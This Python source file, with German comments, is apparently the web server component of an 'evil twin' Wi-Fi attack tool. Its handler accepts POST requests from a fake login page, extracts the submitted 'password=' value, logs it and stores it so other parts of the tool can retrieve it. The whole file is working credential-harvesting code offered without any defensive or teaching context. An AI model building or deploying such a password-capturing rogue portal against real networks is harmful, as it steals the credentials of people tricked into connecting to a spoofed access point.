# attack/evil_twin/webserver.py

from http.server import CGIHTTPRequestHandler, HTTPServer
import threading

class WebserverManager:
    def __init__(self, port=8000):
        self.port = port
        self.server = None
        self.thread = None
        self.last_password = None
        self.running = False

    def run(self):
        self.running = True
        print(f"[*] Starte Webserver auf Port {self.port} ...")

        class Handler(CGIHTTPRequestHandler):
            def do_POST(handler):
                length = int(handler.headers['Content-Length'])
                post_data = handler.rfile.read(length).decode('utf-8')
                # Parse Passwort aus POST (einfache Annahme)
                # z.B. password=xyz
                if "password=" in post_data:
                    pw = post_data.split("password=")[1]
                    self.last_password = pw.strip()
                    print(f"[*] Passwort empfangen: {self.last_password}")
                handler.send_response(200)
                handler.end_headers()
                handler.wfile.write(b"OK")

        self.server = HTTPServer(('', self.port), Handler)
        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            pass

    def get_last_password_attempt(self):
        pw = self.last_password
        self.last_password = None
        return pw

    def notify_invalid_password(self):
        # TODO: ggf. Client benachrichtigen (AJAX)
        pass

    def stop(self):
        if self.server:
            print("[*] Stoppe Webserver ...")
            self.server.shutdown()
            self.server.server_close()
            self.running = False
